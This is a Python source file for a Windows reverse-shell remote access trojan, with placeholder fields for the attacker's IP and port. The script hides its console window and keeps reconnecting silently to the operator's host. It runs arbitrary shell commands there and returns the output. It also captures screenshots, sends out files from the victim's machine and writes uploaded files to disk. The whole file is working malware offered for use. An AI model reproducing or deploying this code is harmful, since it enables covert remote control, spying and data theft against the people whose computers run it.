import socket
import subprocess
import os
import threading
import time
import ctypes
from PIL import ImageGrab
import getpass
from datetime import datetime

# --- Configuration ---
# Replace with your IP and Port
HOST = "ur ip"
PORT = "The port u wanna listen on as an int"
CHUNK_SIZE = 8192

# --- Main Client Logic ---

# Hide the console window on startup
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except Exception:
    # This can fail if not run on Windows, so we ignore it
    pass

def connect():
    """Main connection and command handling loop."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print("Connected successfully!")  # For debugging only

            cwd = os.getcwd()
            user = getpass.getuser()
            hostname = socket.gethostname()

            while True:
                # Send a clean prompt to the server
                prompt = f"[{user}@{hostname} {os.path.basename(cwd)}]> "
                s.sendall(prompt.encode())

                # Receive the full command from the server
                cmd = b""
                while b"\n" not in cmd:
                    try:
                        chunk = s.recv(1024)
                        if not chunk:
                            raise Exception("Disconnected")
                        cmd += chunk
                    except:
                        raise Exception("Receive failed")
                
                cmd = cmd.decode(errors="ignore").strip()

                if cmd.lower() in ["exit", "quit"]:
                    s.sendall(b"Session terminated.\n")
                    break

                if cmd == "clear":
                    s.sendall(b"\033c")
                    continue

                # --- Screenshot Command ---
                if cmd == "screenshot":
                    try:
                        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                        s.sendall(f"\nSaving as: {filename}\n".encode())
                        img = ImageGrab.grab()
                        temp = os.path.join(os.getenv("TEMP"), "sc_tmp.png")
                        img.save(temp)
                        
                        size = os.path.getsize(temp)
                        sent = 0
                        with open(temp, "rb") as f:
                            while True:
                                data = f.read(CHUNK_SIZE)
                                if not data:
                                    break
                                s.sendall(data)
                                sent += len(data)
                                percent = int(100 * sent / size) if size > 0 else 100
                                bar = "#" * (percent // 2) + " " * (50 - percent // 2)
                                s.sendall(f"\rScreenshot: [{bar}] {percent}% ".encode())
                        
                        os.remove(temp)
                        s.sendall(b"\n\n[+] Screenshot complete.\n")
                    except Exception as e:
                        s.sendall(f"\nError: {str(e)}\n".encode())
                    continue

                # --- Download Command ---
                if cmd.startswith("download "):
                    try:
                        file_path = cmd[9:].strip()
                        full_path = os.path.join(cwd, file_path)
                        if os.path.isfile(full_path):
                            filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{os.path.basename(file_path)}"
                            s.sendall(f"\nSaving as: {filename}\n".encode())
                            
                            size = os.path.getsize(full_path)
                            sent = 0
                            with open(full_path, "rb") as f:
                                while True:
                                    data = f.read(CHUNK_SIZE)
                                    if not data:
                                        break
                                    s.sendall(data)
                                    sent += len(data)
                                    percent = int(100 * sent / size) if size > 0 else 100
                                    bar = "#" * (percent // 2) + " " * (50 - percent // 2)
                                    s.sendall(f"\rDownload: [{bar}] {percent}% ".encode())
                            
                            s.sendall(b"\n\n[+] Download complete.\n")
                        else:
                            s.sendall(b"\n[-] File not found.\n")
                    except Exception as e:
                        s.sendall(f"\nError: {str(e)}\n".encode())
                    continue

                # --- Upload Command ---
                if cmd.startswith("upload "):
                    filename = cmd[7:].strip()
                    save_path = os.path.join(cwd, filename)
                    s.sendall(b"\nSend file now (end with ENTER + Ctrl+D)\n")
                    try:
                        with open(save_path, "wb") as f:
                            while True:
                                data = s.recv(CHUNK_SIZE)
                                if not data:
                                    break
                                # This is a very simple and fragile end marker
                                if len(data) < 10:
                                    break
                                f.write(data)
                        s.sendall(b"\n[+] Upload complete.\n")
                    except Exception as e:
                        s.sendall(f"\nError: {str(e)}\n".encode())
                    continue

                # --- CD Command ---
                if cmd.startswith("cd "):
                    try:
                        new_dir = cmd[3:].strip()
                        if not new_dir or new_dir == "~":
                            os.chdir(os.path.expanduser("~"))
                        else:
                            target = os.path.join(cwd, new_dir)
                            if os.path.isdir(target):
                                os.chdir(target)
                            else:
                                s.sendall(b"Directory not found.\n")
                                continue
                        cwd = os.getcwd()
                    except Exception as e:
                        s.sendall(f"Error: {str(e)}\n".encode())
                    continue

                # --- Normal Command Execution ---
                try:
                    proc = subprocess.Popen(
                        cmd,
                        shell=True,
                        cwd=cwd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    output, error = proc.communicate()
                    result = (output or b"") + (error or b"")
                    if result.strip():
                        s.sendall(result + b"\n")
                    else:
                        s.sendall(b"Executed.\n")
                except Exception as e:
                    s.sendall(f"Error: {str(e)}\n".encode())

            s.close()
            break  # Exit retry loop on clean disconnect

        except Exception as e:
            # Silent retry on connection error
            time.sleep(5)

# --- Start the client in a background thread ---
threading.Thread(target=connect, daemon=True).start()

# --- Keep the main thread alive ---
try:
    while True:
        time.sleep(3600)
except KeyboardInterrupt:
    # Allow clean exit with Ctrl+C if run with a console
    pass
